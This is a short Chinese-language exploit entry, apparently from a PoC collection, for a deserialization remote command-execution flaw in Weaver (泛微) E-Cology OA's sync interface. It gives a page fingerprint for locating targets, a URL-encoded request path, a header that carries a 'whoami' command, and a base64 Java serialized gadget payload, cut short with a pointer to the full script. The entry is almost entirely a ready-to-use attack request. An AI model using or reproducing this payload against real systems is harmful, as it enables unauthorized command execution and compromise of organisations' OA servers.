# 泛微OAE-Cologysync接口反序列化命令执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body = "/wui/common/css/w7OVFont_wev8.css"`
- **请求**：`POST /synccach%65.jsp HTTP/1.1`

**请求体 / payload**
```
Firefox/93.0
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q
=0.8
cache: whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 1085
data=rO0ABXNyAC5jb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuSm5kaVJlZkRhdGFTb3VyY2VCYXNlAAAA
AAAAAAEDAAZaAAdjYWNoaW5nTAAUZmFjdG9yeUNsYXNzTG9jYXRpb250ABJMamF2YS9sYW5nL1N0cmluZ
ztMAAdqbmRpRW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAIam5kaU5hbWV0ABJMamF2YS9sYW5nL0
9iamVjdDtMAANwY3N0ACJMamF2YS9iZWFucy9Qcm9wZXJ0eUNoYW5nZVN1cHBvcnQ7TAADdmNzdAAiTGp
hdmEvYmVhbnMvVmV0b2FibGVDaGFuZ2VTdXBwb3J0O3hwdwMAAQBwcHNyAD1jb20ubWNoYW5nZS52Mi5u
YW1pbmc…（脚本共 2691 字，完整版见原文）
```
- **预期**：200　|　—